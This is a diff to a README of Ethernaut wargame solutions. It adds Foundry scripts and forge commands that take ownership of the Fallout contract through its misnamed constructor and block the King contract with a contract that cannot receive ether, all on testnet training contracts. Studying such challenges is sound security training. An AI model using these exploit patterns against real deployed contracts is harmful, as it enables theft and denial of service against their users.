@@ -14,9 +14,28 @@ i'm using sepolia testnet for the transactions, u can choose testnet accordingly
    await contract.authenticate("ethernaut0")
    ```
    or run our script file level00.s.sol
-   ```terminal
-   forge script ./script/level00.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
-   ```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../instances/Ilevel00.sol";
+import "forge-std/Script.sol";
+
+contract Attacker is Script {
+Instance level0 = Instance(0x3c9f001a0C769B5f70739443E9d83227a9Db976e);
+   function run() external {
+      vm.startBroadcast();
+      level0.authenticate("ethernaut0");
+      vm.stopBroadcast();
+   }
+}
+```
+
+```terminal
+forge script ./script/level00.s.sol broadcast -vvvv --rpc-url $RPC_URL --private-key $PKEY
+```
+
 4. submit the instance, u're done
 
 ## level01 - Fallback
@@ -41,10 +60,35 @@ i'm using sepolia testnet for the transactions, u can choose testnet accordingly
 
 1. same as previous one we need to get the ownership here
 2. we can achieve that by simply calling Fal1out() either from the console
-   ```console
-   await contract.Fal1out()
-   ```
-   or using script file level02.s.sol
+
+```console
+await contract.Fal1out()
+```
+
+or using script file level02.s.sol
+
+```solidity
+// SPDX-License-Identifier:MIT
+
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import "../instances/Ilevel02.sol";
+
+contract Attacker is Script {
+    Fallout level2 = Fallout(0xE034b39E70D59f4b3b8881cD8Bbc3a4C86D26dC0);
+
+    function run() external {
+        vm.startBroadcast();
+        console.log("previous owner: ", level2.owner());
+        level2.Fal1out();
+        console.log("updated owner: ", level2.owner());
+
+        vm.stopBroadcast();
+    }
+}
+```
+
 3. submit the instance, u're done.
 
 ## level03 - Coin Flip
@@ -186,3 +230,32 @@ cast send $LEVEL_ADDRESS "unlock(bytes32 _password)" 0x412076657279207374726f6e6
 ```
 
 4. submit the instance, u're done
+
+## level09 - King
+
+1. Acc. to contract we can be the king if we send more or equal value than prize value, but the issue is contract will regain kingship by reusing receive, so we need to do smthg that other's call to the receive() function fail.
+2. so what we're going to do is create a contract with payable constructor to send minimum eth (1000000000000001 wei) to the king contract.
+3. but the catch here is we won't add any receive() or fallback() fun. in our contract to handle ether transfer.
+4. when this happens our contract will not be able to receive any ether thru the transfer function and it will cause a revert avoiding the self proclamation process by king contract.
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../instances/Ilevel09.sol";
+
+contract UltimateKing {
+    constructor(address king) payable {
+        payable(king).call{value: msg.value}("");
+    }
+}
+```
+
+5. deploy the contract
+
+```
+forge create src/level09.sol:UltimateKing --constructor-args $LEVEL_ADDRESS --value 1000000000000001wei --rpc-url $RPC_URL --private-key $PKEY
+```
+
+6. submit the instance, u're done.
